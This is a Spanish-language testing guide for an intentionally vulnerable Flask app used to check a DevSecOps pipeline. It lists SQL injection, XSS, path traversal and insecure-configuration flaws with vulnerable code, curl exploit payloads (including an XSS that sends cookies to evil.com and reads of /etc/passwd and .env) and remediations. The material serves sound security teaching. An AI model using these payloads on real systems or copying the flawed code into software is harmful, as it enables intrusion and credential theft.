# Vulnerabilidades Intencionales - Guía de Testing

Este documento describe las vulnerabilidades implementadas intencionalmente en este proyecto para pruebas de DevSecOps.

## Aplicación Web Vulnerable (app.py)

### 1. SQL Injection (CRÍTICO)
**Endpoint:** `/login`
**Método:** POST

**Descripción:** La consulta SQL concatena directamente el input del usuario sin sanitización.

**Código vulnerable:**
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

**Exploit:**
```bash
# Bypass de autenticación
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1&password=cualquiera"

# Listar todas las tablas
curl -X POST http://localhost:5000/login \
  -d "username=admin' UNION SELECT name, sql, type, NULL FROM sqlite_master WHERE type='table'--&password=x"
```

**Detección esperada:** Wapiti (DAST)

---

### 2. Cross-Site Scripting (XSS)
**Endpoint:** `/search`
**Método:** GET

**Descripción:** El parámetro de búsqueda se refleja en la respuesta HTML sin escape.

**Código vulnerable:**
```python
query = request.args.get('q', '')
return f'<h2>Resultados para: {query}</h2>'
```

**Exploit:**
```bash
# XSS básico
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# XSS con evento
curl "http://localhost:5000/search?q=<img src=x onerror=alert('XSS')>"
```

**Detección esperada:** Wapiti (DAST)

---

### 3. XSS Reflejado
**Endpoint:** `/profile`
**Método:** GET

**Descripción:** El parámetro `user` se refleja sin validación.

**Código vulnerable:**
```python
username = request.args.get('user', 'invitado')
html = f'<p>Nombre de usuario: {username}</p>'
```

**Exploit:**
```bash
curl "http://localhost:5000/profile?user=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
```

**Detección esperada:** Wapiti (DAST)

---

### 4. Path Traversal / Directory Traversal (CRÍTICO)
**Endpoint:** `/file`
**Método:** GET

**Descripción:** Permite leer archivos arbitrarios del sistema sin validación.

**Código vulnerable:**
```python
filename = request.args.get('name', '')
with open(filename, 'r') as f:
    content = f.read()
```

**Exploit:**
```bash
# Leer /etc/passwd en Linux
curl "http://localhost:5000/file?name=../../etc/passwd"

# Leer archivos sensibles del proyecto
curl "http://localhost:5000/file?name=.env"
curl "http://localhost:5000/file?name=requirements.txt"
```

**Detección esperada:** Wapiti (DAST)

---

### 5. Debug Mode Habilitado (ALTO)
**Ubicación:** Configuración global

**Descripción:** Flask ejecuta en modo debug en producción.

**Código vulnerable:**
```python
app.run(debug=True, host='0.0.0.0', port=5000)
```

**Riesgo:** Expone el debugger interactivo de Werkzeug que permite ejecución remota de código.

**Detección esperada:** Wapiti (DAST), Revisión de código

---

### 6. Hardcoded Secrets (ALTO)
**Ubicación:** Configuración de Flask

**Descripción:** La clave secreta está hardcodeada en el código fuente.

**Código vulnerable:**
```python
app.config['SECRET_KEY'] = 'clave-super-secreta-123'
```

**Riesgo:** Permite falsificar sesiones y tokens CSRF.

**Detección esperada:** Revisión de código, SAST

---

### 7. CORS Permisivo (MEDIO)
**Ubicación:** Header HTTP

**Descripción:** Permite solicitudes desde cualquier origen.

**Código vulnerable:**
```python
response.headers['Access-Control-Allow-Origin'] = '*'
```

**Riesgo:** Facilita ataques CSRF y robo de datos.

**Detección esperada:** Wapiti (DAST)

---

## Dependencias Vulnerables (requirements.txt)

### 1. urllib3==1.24.1
**CVE:** CVE-2019-11324
**Severidad:** ALTA
**Descripción:** Bypass de validación de certificados SSL

**Detección esperada:** Safety (SAST)

---

### 2. requests==2.20.0
**CVE:** CVE-2018-18074
**Severidad:** MEDIA
**Descripción:** Redirección no autorizada con credenciales

**Detección esperada:** Safety (SAST)

---

### 3. cryptography==2.3
**CVE:** Múltiples
**Severidad:** CRÍTICA
**Descripción:** Vulnerabilidades en criptografía

**Detección esperada:** Safety (SAST)

---

### 4. Jinja2==2.10.1
**CVE:** CVE-2019-8341
**Severidad:** ALTA
**Descripción:** XSS en templates

**Detección esperada:** Safety (SAST)

---

### 5. PyYAML==3.13
**CVE:** CVE-2017-18342
**Severidad:** CRÍTICA
**Descripción:** Ejecución arbitraria de código mediante deserialización

**Detección esperada:** Safety (SAST)

---

## Resultados Esperados del Pipeline

### Safety (SAST) - Etapa 3
- ✅ Detectar 5+ dependencias vulnerables
- ✅ Reportar CVEs específicos
- ✅ Proporcionar versiones seguras recomendadas

### Wapiti (DAST) - Etapa 7
- ✅ SQL Injection en `/login`
- ✅ XSS en `/search` y `/profile`
- ✅ Path Traversal en `/file`
- ✅ CORS mal configurado
- ✅ Headers de seguridad faltantes
- ✅ Información de debug expuesta

### Flake8 (Quality) - Etapa 4
- ⚠️ Advertencias de estilo
- ⚠️ Complejidad ciclomática alta
- ⚠️ Líneas demasiado largas

---

## Remediación Recomendada

### Para SQL Injection:
```python
# Usar parámetros preparados
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

### Para XSS:
```python
from markupsafe import escape
return f'<h2>Resultados para: {escape(query)}</h2>'
```

### Para Path Traversal:
```python
import os
from werkzeug.utils import secure_filename

filename = secure_filename(request.args.get('name', ''))
safe_path = os.path.join(UPLOAD_FOLDER, filename)
```

### Para Dependencias:
```bash
# Actualizar a versiones seguras
pip install --upgrade urllib3 requests cryptography Jinja2 PyYAML
```

---

## Testing Manual

### 1. Ejecutar la aplicación:
```bash
python app.py
```

### 2. Probar vulnerabilidades:
```bash
# SQL Injection
curl -X POST http://localhost:5000/login -d "username=admin' OR '1'='1&password=x"

# XSS
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Path Traversal
curl "http://localhost:5000/file?name=../README.md"
```

### 3. Ver reporte de Wapiti:
```bash
# Después de ejecutar el pipeline
open reporte_seguridad/wapiti_report.html
```

---

**RECORDATORIO:** Estas vulnerabilidades son INTENCIONALES para propósitos educativos. NUNCA implementar código similar en producción.
